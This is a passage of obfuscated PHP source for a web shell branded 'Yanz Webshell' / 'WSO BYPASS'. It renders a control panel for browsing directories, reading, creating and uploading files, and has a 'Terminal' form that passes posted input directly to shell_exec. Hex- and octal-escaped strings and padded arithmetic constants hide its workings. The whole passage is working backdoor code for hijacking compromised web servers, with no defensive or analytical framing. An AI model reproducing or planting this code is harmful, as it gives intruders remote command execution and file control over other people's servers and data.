        echo "<ta\x62l\x65 \x63lass=inf\x6f c\145llpad\144\151ng=3 cellspaci\x6eg=0\040wid\x74h=100%><tr><td\040wi\144th=1><span><fon\164 c\157lor=r\x65\144>Attention:<\x2f\x66ont><br\076\x55n\x61\155e:<b\162>Php\072<br>Hdd\x3a<\142r>Cwd:" . ($_vor == "\x77in" ? "<br>D\162i\x76es\072" : "") . "</s\160\x61n><\x2ftd\x3e" . "<td><a href='https://t.me/yanz54321'</a><u><b>Yanz Webshell!</b\x3e \055 PRIV8 WEB SHELL ORB YANZ BYPASS!</\165>\074/\141\x3e<br><nob\162>" . ($_v ? subsTr($_v, -01 + 01, (int)round(40 + 40 + 40)) : "N/A") . "</no\142r><br>" . @pHPversiON() . " <sp\141n>S\141fe mode:</span> " . ($_vpb ? "<font color=r\x65d>ON<\057fon\164\x3e" : "\074f\157n\x74 color=gree\156>\074\142>OF\106</b></fo\156t>") . " \074span>\104ateti\155e:\x3c/sp\141n>\040" . daTE("Y-m-d \x48:i:s") . "<br>" . ($_ejl ? vIewSIZe($_ejl) : "") . " <span>F\x72ee:</s\x70an\076 " . ($_pn ? vIewSiZe($_pn) : "") . " (" . (($_pn && $_ejl) ? (int)($_pn / $_ejl * (0157 + 0136 - 0151)) : "0") . "%)<b\162><span id=\042link\163\x22 class=\042wfw\042>" . $_bl . " " . WPerMSCOLOr($_za) . " <a href\x3d# onc\x6cick=\042g\050'fm','" . STr_rot13($_wda) . "','',''\054'')\x22>[\x20root ]</a> <a h\x72ef\x3d# onc\x6cick=\042g\x28'fm','" . Str_rOT13($_zrt) . "','','',\047')\042>[ \150o\155\x65 ]\x3c/a>\074/span><span \151\144=\042cwd\x22 styl\x65=\x22\x64isplay: \x6eone\x3b\x22 class=\x22wfw\042><input size=" . (STrlen($_za) + (int)round(11 + 11)) . " type=text\040valu\x65=\042" . $_za . "\042>\074/s\160an> <a \x68ref=# oncli\x63\153\075\042show()\073\042><font\040\x63olo\162=#fff i\x64=\042bat\x22>\124ex\x74</\146ont\x3e</a><br>" . $_dej . "\x3c/td\x3e" . "<td width=1 alig\156=rig\x68t>\x3cnobr>\x3csele\143t onchan\x67e=\042g(null,null\054" . (!empty($_POST["p"]) ? "'" . $_POST["p"] . "'" : "null") . ",null,nu\154l,t\x68is.v\141lue\x29\x22><optgroup labe\154=\x22Page charset\x22>" . $_n . "<\x2fo\x70tgroup><\x2f\163el\145\x63t>\074br>\x3c\163p\141n>\123e\162ver\x20IP:</sp\x61\x6e><br>" . $_uy . "<br>\074span>Cl\151ent I\x50:</sp\141n><\x62r>" . $_SERVER["REMOTE_ADDR"] . "</nob\x72></td></t\x72\076</table>" . "<table style=\042bo\162\x64er-top:2px solid \x233\x33\x33;\x22 cellpa\x64d\x69ng=3 \143ellspa\143\151ng=0 \x77idth\x3d100%><t\x72>" . $_h . "</\164r><\057table><div \163ty\x6ce=\x22ma\162gin:5\042\076";
    }

    function wfOotER()
    {
        $_za = $this->_za;
        $_lia = @is_WrItabLe($_za) ? "\x20<font color='green'>(Writeable)</fon\x74>" : " <fo\x6et colo\162=r\145d>\050Not writable\x29<\057font\076";
        echo "</div\076<table\x20c\x6cass=info \x69d=toolsTb\x6c cellpadding=3 cellspaci\156\147=0 \167idth=10\x30%  \163t\x79le='borde\162-top:2px \x73olid #\x3333;b\x6frder-bottom:2px so\154\151\144 #333;'><\164r><td><\x66orm onsubmit='g(null,rot13(\164his\x2ec\056value\051,\042\042)\x3breturn\040false\073'>\074spa\x6e>Change di\162\072</span><\142r><\151nput\x20clas\x73='toolsInp' \164yp\145=tex\x74 name=\143 value='" . HtMlSpeCiaLcHArS($_za) . "'><input type=submi\164 \x76alue='>>'>\x3c/for\155\076</td><\x74d\076<form onsubmit=\042\x67('ft',null,rot\0613(\x74his.f\056v\141\x6cue));return false;\042><span>R\145ad fil\x65:</s\160a\x6e><\142r><\151nput class='t\x6folsInp\x27 type\075tex\164\x20\156ame\075\146><\x69nput \x74ype=submit \x76alue='>>\x27\x3e</\x66orm></\164d><\x2f\x74r><tr><td>\074form \x6fn\x73ub\x6dit=\x22g('f\x6d\x27,nul\x6c,'m\x6b\x64ir',rot13(this.\x64.value));r\145\164urn fal\x73e;\x22><span\076Make dir:<\x2fs\160\x61n>" . $_lia . "<br>\074input \x63la\x73s='t\157ol\x73Inp' type=text n\x61\x6de\x3d\x64>\x3ci\x6eput\x20type=submit val\165e='>>'\076</f\x6frm><\057td><td><for\155 onsubmi\x74=\042g('\x66t',n\165\x6cl,rot13(thi\163\x2ef.value),\x27mkf\151le');re\x74urn fal\x73\145;\042\x3e<span>Make f\x69l\145:</span>" . $_lia . "<b\x72><\x69nput cl\x61ss='\164oolsInp' type=t\x65\x78t name\075f\x3e<input type=subm\x69t value\075'>>'></for\155></\164d>\x3c/tr><tr><td><f\157rm onsub\x6dit=\042g('ce',nu\154l,utoa(this.c.value));re\164urn false;\042\076</\x61\x3e</form><form method=post ><span>Terminal:</span><br><input class='toolsInp' type=text name=command value='' autocomplete='off'><input type=submit value='>>' name='subcmd'></form></td><span></td><\164d><\146orm metho\x64\075'po\x73t' ENCTYPE='m\165ltipar\164/form\x2dd\141ta'><\151nput typ\x65=\150idden name=a value='fm'\x3e\074input \164ype=hidden n\x61me=c val\x75e='" . sTr_RoT13($_za) . "\047><input type=hidde\156 name=p value='uploadFi\154\145'><inpu\x74 typ\x65=hidden n\141m\x65=ch value='" . (@isset($_POST["ch"]) ? $_POST["\x63h"] : "") . "'>\x3c\x73pa\x6e\x3e\125pload\040file:</span>" . $_lia . "\074br><input class='\164oolsInp' type=file name=f><input\040type=submit value=\047>>'></f\157rm><\x62r \040\076<\x2ftd></tr>\x3c/\164able><center><img src='https://cdn.privdayz.com/images/logo.jpg' height='15' width='75' referrerpolicy='unsafe-url' /></center></div></body>\074/html>";
    }
}

function vIewSIze($_xwm, $_yj = null)
{
    if (iS_INt($_xwm)) $_xwm = @spRINtf("%\165", $_xwm);
    if ($_xwm >= (int)round(357913941.33333 + 357913941.33333 + 357913941.33333)) return @spRINtf("%1.2f", $_xwm / (010000001240 + -01240)) . " GB"; elseif ($_xwm >= (03777073 - 04000560 + 04001465)) return @SprinTF("%\061.2f", $_xwm / (int)round(349525.33333333 + 349525.33333333 + 349525.33333333)) . " MB";
    elseif ($_xwm >= (int)round(512 + 512)) return @sPRinTf("%1\x2e\062f", $_xwm / (int)round(341.33333333333 + 341.33333333333 + 341.33333333333)) . " KB";
    else return $_xwm . " B";
}

function WPerMs($_l)
{
    if (($_l & (0140371 - 0137733 + 0137342)) == (0137615 - -0163)) $_o = "s"; elseif (($_l & (int)round(20480 + 20480)) == (0117774 - -04)) $_o = "l";
    elseif (($_l & (int)round(10922.666666667 + 10922.666666667 + 10922.666666667)) == (0100270 + -0270)) $_o = "-";
    elseif (($_l & (int)round(8192 + 8192 + 8192)) == (int)round(12288 + 12288)) $_o = "\142";
    elseif (($_l & (int)round(8192 + 8192)) == (037655 - 040121 - -040244)) $_o = "d";
    elseif (($_l & (int)round(2730.6666666667 + 2730.6666666667 + 2730.6666666667)) == (017574 + 0204)) $_o = "c";
    elseif (($_l & (int)round(1365.3333333333 + 1365.3333333333 + 1365.3333333333)) == (010110 + -0110)) $_o = "\160";
    else $_o = "u";
    $_o .= (($_l & (0752 + 044 - 0416)) ? "r" : "-");
    $_o .= (($_l & (int)round(42.666666666667 + 42.666666666667 + 42.666666666667)) ? "w" : "-");
    $_o .= (($_l & (-01223 - -01323)) ? (($_l & (int)round(682.66666666667 + 682.66666666667 + 682.66666666667)) ? "s" : "x") : (($_l & (05014 + 04725 + -05741)) ? "S" : "-"));
    $_o .= (($_l & (-01044 - -01104)) ? "r" : "-");
    $_o .= (($_l & (020 + 022 - 022)) ? "w" : "\055");
    $_o .= (($_l & (int)round(2.6666666666667 + 2.6666666666667 + 2.6666666666667)) ? (($_l & (01564 + 01365 + -01151)) ? "s" : "x") : (($_l & (int)round(512 + 512)) ? "\x53" : "-"));
    $_o .= (($_l & (int)round(1.3333333333333 + 1.3333333333333 + 1.3333333333333)) ? "r" : "-");
    $_o .= (($_l & (int)round(0.66666666666667 + 0.66666666666667 + 0.66666666666667)) ? "w" : "-");$_o .= (($_l & (0106 - 0105)) ? (($_l & (int)round(170.66666666667 + 170.66666666667 + 170.66666666667)) ? "t" : "x") : (($_l & (0765 + 0470 - 0455)) ? "\x54" : "-"));
    return $_o;
}

function wpERmsCOlor($_rb)
{
    if (!@is_rEAdaBLE($_rb)) return "<font color=#FF0000\076" . wPErms(fILEpERMs($_rb)) . "</fon\164>"; elseif (!@iS_WRItabLE($_rb)) return "<fon\x74\040col\x6fr=wh\x69te\x3e" . wPERms(FIlEperMS($_rb)) . "</font>";
    else return "<f\157nt co\x6cor=#\x32\x35ff00>" . wpeRmS(FiLepERmS($_rb)) . "</font>";
}

function wScanDIR($_pa, $_u = "uvxf")
{
    if (funCTion_exISTs("scandir")) {
        return @ScAnDIr($_pa);
    } else {
        if ($_hcf = @oPENDIr($_pa)) {
            while (false !== ($_nm = @reAdDIR($_hcf))) $_vgl[] = $_nm;
            @ClOseDIr($_hcf);
        }
        return $_vgl;
    }
}

$_tcn = new _pps();
$_tcn->AFTErlOGin();
$_tcn->STaRtup();
if (@isset($_POST["a"])) {
    switch ($_POST["\x61"]) {
        case "fm":
            $_tcn->WheADer();
            $_tcn->acTfm();
            $_tcn->wfOoter();
            break;
        case "ft":
            if (@isset($_POST["x"]) && $_POST["x"] == "\x64ownl\x6f\141d") {
                $_tcn->aCtFT();
            } else {
                $_tcn->wHeADeR();
                $_tcn->aCTFT();
                $_tcn->wfoOteR();
            }
            break;
        case "\x73\x72":
            $_tcn->WhEAdEr();
            $_tcn->aCtSr();
            $_tcn->wfOOTer();
            break;
        case "Logout":
            $_tcn->actLoGoUT();
            break;
        default:
            $_tcn->WHeaDer();
            $_tcn->ActfM();
            $_tcn->WFOOtEr();
            break;
    }
} elseif (!@isset($_POST["\x61"])) {
    $_tcn->WHeAdER();
    $_tcn->AcTfm();
    $_tcn->WfOOTER();
    if (isset($_POST['subcmd'])) {
        echo "<pre class='text-white'>";
        $input = $_POST['command'];
        $output = shell_exec($input);
        echo "<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>";
        echo "<center>WSO BYPASS YANZ!</center>";
        echo "<br>";
        echo '$WSOYanZ: ';
        echo $output;
        echo "</pre>";
        exit;
    }
};
?>